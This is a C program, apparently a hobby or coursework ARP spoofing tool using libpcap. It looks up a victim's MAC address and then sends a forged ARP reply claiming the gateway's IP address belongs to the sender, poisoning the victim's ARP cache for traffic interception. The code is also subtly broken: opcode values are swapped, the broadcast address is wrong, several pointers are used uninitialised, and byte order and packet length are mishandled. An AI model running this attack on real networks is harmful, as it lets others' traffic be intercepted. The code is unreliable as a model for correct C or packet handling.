#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>

#define MACLEN 6
#define ARP 0x0806
#define ETHERNET 0x0001
#define IPv4 0x0800
#define ETHERSIZE 0x06
#define IPSIZE 0x04
#define REQUEST 0x0002
#define REPLY 0x0001
#define ETHERNETLEN 14
#define ARPLEN 28

uint8_t mymac[MACLEN];
uint32_t myip;
uint8_t *device;

void getMyinfo(){
    struct ifreq s;
    struct sockaddr_in *sin;
    int i;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, device);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        for (i = 0; i < MACLEN; ++i)
            mymac[i] = s.ifr_addr.sa_data[i];

        sin = (struct sockaddr_in*)&s.ifr_addr;
        inet_ntop(AF_INET, &sin->sin_addr.s_addr, myip, sizeof(myip));

        close(fd);

        return;
    }

    close(fd);
    fprintf(stderr, "Socket Error\n");
    exit(2);
}

struct ether_header{
    uint8_t dest_mac[MACLEN];
    uint8_t src_mac[MACLEN];
    uint16_t ether_type;
};

struct arp_header{
    uint16_t hw_type;
    uint16_t protocol_type;
    uint8_t hw_size;
    uint8_t protocol_size;
    uint16_t opcode;
    uint8_t send_mac[MACLEN];
    uint32_t send_ip;
    uint8_t target_mac[MACLEN];
    uint32_t target_ip;
};


int main(int argc, char ***argv)
{

    int i;
    char *dev;
    uint8_t *packet;
    uint8_t *res;
    uint32_t packet_length = 0;
    pcap_t *handle;
    struct pcap_pkthdr header;
    char errbuf[PCAP_ERRBUF_SIZE];

    struct ether_header original_ether;
    struct ether_header *original_reply;
    struct arp_header original_arp;
    struct ether_header attack_ether;
    struct arp_header attack_arp;

    uint16_t reply_ether_type;
    uint8_t victim_mac[MACLEN];
    uint8_t *gateway_ip;
    uint8_t *victim_ip;
    uint8_t *buf;
/*
    if(argc != 1){
        fprintf(stderr, "Argument Error\n");
        return 2;
    }
*/
    dev = argv[1];
    buf = argv[2];
    inet_pton(AF_INET, &buf, victim_ip);
    buf = argv[3];
    inet_pton(AF_INET, &buf, gateway_ip);

    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL){
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return 2;
    }


    getMyinfo();

    for (i = 0; i<MACLEN; i++){
        original_ether.dest_mac[i] = 0xF;
    }
    for (i = 0; i<MACLEN; i++){
        original_ether.src_mac[i] = mymac[i];
    }
    original_ether.ether_type = ARP;

    original_arp.hw_type = ETHERNET;
    original_arp.protocol_type = IPv4;
    original_arp.hw_size = ETHERSIZE;
    original_arp.protocol_size = IPSIZE;
    original_arp.opcode = REQUEST;
    for(i = 0; i<MACLEN; i++){
        original_arp.send_mac[i] = mymac[i];
    }
    original_arp.send_ip = myip;
    for(i = 0; i<MACLEN; i++){
        original_arp.target_mac[i] = 0x0;
    }
    original_arp.target_ip = victim_ip;

    memset(packet, 0, sizeof(packet));
    memcpy(packet, &original_ether, sizeof(original_ether));
    packet_length += sizeof(original_ether);

    memcpy(packet+packet_length, &original_arp, sizeof(original_arp));
    packet_length += sizeof(original_arp);

    if (packet_length < ETHERNETLEN+ARPLEN){
        for(i = packet_length; i<ETHERNETLEN+ARPLEN; i++)
            packet[i] = 0;
    }

    if(pcap_sendpacket(handle, packet, packet_length != 0)){
        fprintf(stderr, "Error sending the packet\n");
        return 2;
    }

    while((res = pcap_next_ex(handle, &header, &packet)) >= 0){

        original_reply = (struct ether_header*)packet;
        reply_ether_type = ntohs(original_reply->ether_type);

        if(reply_ether_type == ARP){
            for (i = 0; i<MACLEN; i++){
                victim_mac[i] = original_reply->src_mac[i];
            }
            break;
        }
    }

    for(i = 0; i<MACLEN; i++){
        attack_ether.dest_mac[i] = mymac[i];
    }
    for(i = 0; i<MACLEN; i++){
        attack_ether.src_mac[i] = victim_mac[i];
    }
    attack_ether.ether_type = ARP;

    attack_arp.hw_type = ETHERNET;
    attack_arp.protocol_type = IPv4;
    attack_arp.hw_size = ETHERSIZE;
    attack_arp.protocol_size = IPSIZE;
    attack_arp.opcode = REPLY;
    for(i = 0; i<MACLEN; i++){
        attack_arp.send_mac[i] = mymac[i];
    }
    attack_arp.send_ip = gateway_ip;
    for(i=0; i<MACLEN; i++){
        attack_arp.target_mac[i] = victim_mac[i];
    }
    attack_arp.target_ip = victim_ip;

    packet_length = 0;
    memset(packet, 0, sizeof(packet));
    memcpy(packet, &attack_ether, sizeof(attack_ether));
    packet_length += sizeof(attack_ether);

    memcpy(packet+packet_length, &attack_arp, sizeof(attack_arp));
    packet_length += sizeof(attack_arp);

    if (packet_length < ETHERNETLEN+ARPLEN){
        for(i = packet_length; i<ETHERNETLEN+ARPLEN; i++)
            packet[i] = 0;
    }

    if(pcap_sendpacket(handle, packet, packet_length != 0)){
        fprintf(stderr, "Error sending the attack packet\n");
        return 2;
    }

    return 0;
}
